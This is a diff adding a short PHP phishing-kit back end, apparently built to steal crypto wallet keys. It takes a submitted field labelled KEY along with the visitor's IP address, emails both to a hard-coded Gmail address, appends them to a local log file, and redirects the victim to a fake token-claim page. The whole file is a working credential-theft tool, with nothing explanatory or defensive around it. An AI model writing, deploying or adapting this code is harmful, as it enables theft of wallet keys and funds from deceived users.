@@ -1,0 +1,48 @@
+<?php
+
+
+/*========== [ Variables ]==========*/
+$ip 		= getenv("REMOTE_ADDR");
+$kudo   = $_POST['tel'];
+/*========== [ Variables ]==========*/
+
+
+$message = "
+==$$$==== *** SIJAT ***=====$$$==
+KEY   : $kudo
+==$$$==== *** SIJAT ***=====$$$==
+IP	: $ip
+==========[ THANK'S YOU ]==========";
+
+
+$to = "sampojumai@gmail.com"; // Email Here
+$subject = "KEY = [$ip]";
+$headers = "From: MASOK <dsf54677867867868678@hotmail.com>";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "PAK EKO";
+
+mail($to, $subject, $message,$headers);
+header("Location:https://auth-code.moy.su/claim-busdtoken.html");
+
+
+?>
+
+<?php
+$ip   = getenv("REMOTE_ADDR");
+$file = "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.txt";
+$kudo   = $_POST['tel'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "=================================");
+fwrite($handle, "\n");
+fwrite($handle, "sande  : ");
+fwrite($handle, "$kudo");
+fwrite($handle, "\n");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "=================================");
+fwrite($handle, "\n");
+fclose($handle);
+
+?>
